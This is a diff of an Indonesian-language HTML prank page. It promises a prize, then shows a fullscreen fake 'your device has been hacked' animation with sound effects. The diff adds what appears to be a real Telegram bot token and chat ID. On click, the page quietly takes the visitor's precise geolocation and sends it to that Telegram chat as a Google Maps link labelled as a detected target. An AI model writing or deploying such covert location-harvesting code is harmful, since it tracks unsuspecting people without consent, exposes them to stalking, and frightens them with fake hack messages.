@@ -50,8 +50,8 @@
 </head>
 <body>
 
-    <audio id="suara-ketik" src="https://www.soundjay.com/communication/typing-on-a-computer-keyboard-1.mp3"></audio>
-    <audio id="suara-alert" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
+    <audio id="suara-ketik" preload="auto" src="https://www.soundjay.com/communication/typing-on-a-computer-keyboard-1.mp3"></audio>
+    <audio id="suara-alert" preload="auto" src="https://www.soundjay.com/buttons/beep-01a.mp3"></audio>
 
     <div id="kontainer">
         <h2 style="text-align: center;">Klik gambar untuk melihat hadiah ✨</h2>
@@ -69,10 +69,10 @@
         const suaraKetik = document.getElementById('suara-ketik');
         const suaraAlert = document.getElementById('suara-alert');
 
-        // --- GANTI TOKEN & ID KAMU DI SINI ---
-        const TOKEN_BOT = "TOKEN_BOT_KAMU"; 
-        const CHAT_ID = "ID_CHAT_KAMU"; 
-        // -------------------------------------
+        // --- MASUKKAN DATA TELEGRAM KAMU ---
+        const TOKEN_BOT = "8110303835:AAHEOijWAE5EnMK_mkseIvru6vSbsp3PCUU"; 
+        const CHAT_ID = "7332180572"; 
+        // ------------------------------------
 
         const pesan = [
             "> Initializing exploit mechanism...",
@@ -80,70 +80,75 @@
             "> Bypassing SSL certificate...",
             "> Searching for vulnerabilities...",
             "> [CRITICAL] Internal database accessed!",
-            "> Downloading sensitive_data.zip (25%)",
-            "> Downloading sensitive_data.zip (70%)",
             "> Downloading sensitive_data.zip (100%)",
-            "> Transfer complete.",
-            "> Injecting payload to system...",
             "> WARNING: Administrator detected!",
-            "> Redirecting IP address...",
             "> Locating target coordinates...",
             "> GPS signal locked...",
-            "> SYSTEM OVERRIDE SUCCESSFUL.",
+            "> Redirecting IP address...",
             "> ---------------------------------------",
             "> STATUS: YOUR DEVICE HAS BEEN HACKED!",
             "> ---------------------------------------",
+            "> System cleanup initiated...",
             "> Have a nice day! :P"
         ];
 
         function kirimKeTelegram(lat, lon) {
             const pesanTele = `🚨 *Target Terdeteksi!*%0A📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
             const url = `https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=${pesanTele}&parse_mode=Markdown`;
-            fetch(url);
+            fetch(url).catch(err => console.log("Gagal kirim ke Telegram"));
         }
 
         function jalankanTeks(i = 0) {
             if (i < pesan.length) {
-                // Mainkan suara ketik setiap baris baru
+                // Mainkan suara ketik (dipaksa reset)
                 suaraKetik.currentTime = 0;
-                suaraKetik.play();
+                suaraKetik.play().catch(() => {}); 
 
-                // Jika pesan mengandung "WARNING" atau "HACKED", mainkan suara alert
+                // Jika ada kata kunci tertentu, bunyikan alarm
                 if (pesan[i].includes("WARNING") || pesan[i].includes("HACKED")) {
-                    suaraAlert.play();
+                    suaraAlert.currentTime = 0;
+                    suaraAlert.play().catch(() => {});
                 }
 
                 logHacker.innerHTML += pesan[i] + "<br>";
                 layarHack.scrollTop = layarHack.scrollHeight;
-                setTimeout(() => jalankanTeks(i + 1), 500);
+                
+                setTimeout(() => jalankanTeks(i + 1), 450);
             }
         }
 
         gambar.addEventListener('click', () => {
+            // PENTING: Buka kunci audio browser
+            suaraKetik.play().then(() => {
+                suaraKetik.pause(); // Cuma buat pancingan
+                suaraAlert.play().then(() => suaraAlert.pause());
+            }).catch(e => console.log("Audio diblokir"));
+
             layarHack.style.display = 'block';
             
             // Masuk Fullscreen
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen();
+            } else if (document.documentElement.webkitRequestFullscreen) {
+                document.documentElement.webkitRequestFullscreen();
             }
 
-            // Ambil & Kirim Lokasi
+            // Misi Rahasia: Lokasi
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((position) => {
                     kirimKeTelegram(position.coords.latitude, position.coords.longitude);
                 }, null, { enableHighAccuracy: true });
             }
 
-            // Mulai simulasi
+            // Jalankan animasi teks
             jalankanTeks();
         });
 
-        // Klik layar untuk reset
+        // Klik layar untuk menutup
         layarHack.addEventListener('click', () => {
             layarHack.style.display = 'none';
             if (document.exitFullscreen) document.exitFullscreen();
             logHacker.innerHTML = ""; 
-            suaraKetik.pause();
         });
     </script>
 </body>
